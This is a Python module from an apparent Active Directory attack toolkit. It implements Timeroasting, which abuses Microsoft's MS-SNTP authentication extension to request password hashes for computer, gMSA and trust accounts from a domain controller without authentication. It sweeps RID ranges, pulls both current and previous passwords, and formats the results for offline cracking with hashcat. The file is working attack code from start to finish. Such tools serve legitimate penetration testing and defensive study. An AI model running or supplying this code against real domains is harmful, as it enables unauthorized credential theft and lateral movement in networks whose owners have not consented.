"""Timeroasting: extract SNTP password hashes for computer/gMSA/trust accounts.

Abuses Microsoft's NTP authentication extension (MS-SNTP) to request
password-equivalent hashes from a domain controller without authentication.
Targets computer, gMSA, and trust accounts, which sometimes have weak or default
passwords (e.g., legacy NT4 computer name as password).

Two packet formats, two hash algorithms::

    68-byte  Authenticator        → MD5(NTOWFv1 || salt)        → hashcat 31300
    120-byte ExtendedAuthenticator → KDF+HMAC-SHA512(NTOWFv1, ...) → no hashcat yet

Code flow (--format both --password both = 4 packets per RID)::

    timeroast()                        ← public entry point
      │
      ├─ password="current" or "both"
      │    └─ _send_for_format(fmt, old_pwd=False)
      │         ├─ fmt="auth":     ntp_roast(extended=False)  → 68B MD5
      │         ├─ fmt="extended": ntp_roast(extended=True)   → 120B SHA512
      │         └─ fmt="both":     ntp_roast(extended=False)  → 68B MD5
      │                            + ntp_roast(extended=True)  → 120B SHA512
      │
      ├─ password="previous" or "both"
      │    └─ _send_for_format(fmt, old_pwd=True)
      │         (same structure, all RIDs, bit 31 set in 68B Key Identifier)
      │
      └─ _responses_to_results()       Format NtpResponse → RoastResult
           ├─ 68-byte:  format_sntp_hash()       → $sntp-ms$RID$hash$salt
           └─ 120-byte: format_sntp_sha512_hash() → $sntp-ms-sha512$RID$hash$salt
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

from kerbwolf.core.ntp import NtpResponse, ntp_roast
from kerbwolf.hashcat import format_sntp_hash, format_sntp_sha512_hash
from kerbwolf.models import HashcatMode, RoastResult

if TYPE_CHECKING:
    from collections.abc import Iterable

    from kerbwolf.models import TimeroastAccount

_log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Results
# ---------------------------------------------------------------------------


@dataclass
class TimeroastResults:
    """Results from a timeroasting run, split by password age.

    ``current`` and ``previous`` each contain a flat list of RoastResult
    objects.  Each result's ``hash_string`` starts with ``$sntp-ms$`` (MD5)
    or ``$sntp-ms-sha512$`` (KDF+HMAC-SHA512) depending on the packet
    format the DC responded with.

    When LDAP accounts are provided, ``username`` is set to the
    sAMAccountName instead of a bare RID string.
    """

    current: list[RoastResult] = field(default_factory=list)
    previous: list[RoastResult] = field(default_factory=list)


# ---------------------------------------------------------------------------
# NtpResponse → RoastResult conversion
# ---------------------------------------------------------------------------


def _responses_to_results(
    responses: list[NtpResponse],
    rid_to_name: dict[int, str] | None = None,
) -> list[RoastResult]:
    """Convert raw NTP responses to formatted hash strings.

    Every NtpResponse is either MD5 (68-byte) or SHA512 (120-byte) - these
    are exhaustive and mutually exclusive, determined by packet length.

    If ``rid_to_name`` is provided, ``username`` is set to the sAMAccountName.
    Otherwise it is set to the bare RID string.
    """
    results: list[RoastResult] = []

    for resp in responses:
        label = rid_to_name.get(resp.rid, str(resp.rid)) if rid_to_name else str(resp.rid)

        if resp.is_md5:
            # 68-byte Authenticator: MD5(NTOWFv1 || salt)
            results.append(
                RoastResult(
                    username=label,
                    realm="",
                    spn="",
                    etype=0,
                    hash_string=format_sntp_hash(resp.md5_hash, resp.salt, resp.rid),
                    hashcat_mode=HashcatMode.SNTP_MS,
                )
            )

        else:
            # 120-byte ExtendedAuthenticator: KDF+HMAC-SHA512
            results.append(
                RoastResult(
                    username=label,
                    realm="",
                    spn="",
                    etype=0,
                    hash_string=format_sntp_sha512_hash(resp.checksum, resp.salt, resp.rid),
                    hashcat_mode=0,  # no hashcat module yet
                )
            )

    return results


# ---------------------------------------------------------------------------
# Format dispatch: send packets for one or both formats
# ---------------------------------------------------------------------------


def _send_for_format(
    *,
    dc_ip: str,
    rids: Iterable[int],
    rate: int,
    timeout: float,
    src_port: int,
    port: int,
    old_pwd: bool,
    fmt: str,
) -> list[NtpResponse]:
    """Send NTP probes for the requested format and return raw responses.

    - ``auth``:     Send 68-byte packets for all RIDs.
    - ``extended``: Send 120-byte packets for all RIDs.
    - ``both``:     Send 68-byte for all RIDs, then 120-byte for all RIDs.
    """
    kwargs = {"rate": rate, "timeout": timeout, "old_pwd": old_pwd, "src_port": src_port, "port": port}

    if fmt == "auth":
        return ntp_roast(dc_ip, rids, extended=False, **kwargs)

    if fmt == "extended":
        return ntp_roast(dc_ip, rids, extended=True, **kwargs)

    # fmt="both": 68-byte for all RIDs, then 120-byte for all RIDs
    auth_results = ntp_roast(dc_ip, rids, extended=False, **kwargs)
    ext_results = ntp_roast(dc_ip, rids, extended=True, **kwargs)
    return auth_results + ext_results


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------


_MODE_CURRENT = "current"
_MODE_PREVIOUS = "previous"
_MODE_BOTH = "both"


def timeroast(
    *,
    dc_ip: str,
    rids: Iterable[int] | None = None,
    accounts: list[TimeroastAccount] | None = None,
    rate: int = 180,
    timeout: float = 24.0,
    src_port: int = 0,
    port: int = 123,
    password: str = _MODE_CURRENT,
    fmt: str = "auth",
) -> TimeroastResults:
    """Send NTP requests and extract SNTP password hashes.

    RID source (mutually exclusive):

    - ``rids``: Explicit RID values (from ``-r`` / ``-R``).
    - ``accounts``: LDAP-discovered ``TimeroastAccount`` list (from ``--ldap``).
      RIDs are extracted from accounts, and sAMAccountNames are used as labels.
    - Neither: defaults to RIDs 500-10000.

    Password passes:

    - ``current``:  One pass with old_pwd=False.
    - ``previous``: One pass with old_pwd=True.
    - ``both``:     Current pass for all RIDs, then previous pass for all RIDs.

    Format passes:

    - ``auth``:     68-byte Authenticator (MD5, hashcat 31300).
    - ``extended``: 120-byte ExtendedAuthenticator (KDF+HMAC-SHA512).
    - ``both``:     68-byte for all RIDs, then 120-byte for all RIDs.

    Combining ``--password both --format both`` sends 4 packets per RID.

    """
    # Build RID list and optional name mapping from accounts or rids.
    rid_to_name: dict[int, str] | None = None
    if accounts is not None:
        rids = [a.rid for a in accounts]
        rid_to_name = {a.rid: a.samaccountname for a in accounts}
    elif rids is None:
        rids = range(500, 10001)

    # Materialize iterators when multiple passes will consume the same RIDs.
    if _MODE_BOTH in (password, fmt):
        rids = list(rids)

    roast_kwargs = {"dc_ip": dc_ip, "rate": rate, "timeout": timeout, "src_port": src_port, "port": port, "fmt": fmt}
    results = TimeroastResults()

    # --- Pass 1: current password ---
    if password in (_MODE_CURRENT, _MODE_BOTH):
        raw = _send_for_format(rids=rids, old_pwd=False, **roast_kwargs)
        results.current = _responses_to_results(raw, rid_to_name)

    # --- Pass 2: previous password ---
    if password in (_MODE_PREVIOUS, _MODE_BOTH):
        raw = _send_for_format(rids=rids, old_pwd=True, **roast_kwargs)
        results.previous = _responses_to_results(raw, rid_to_name)

    return results
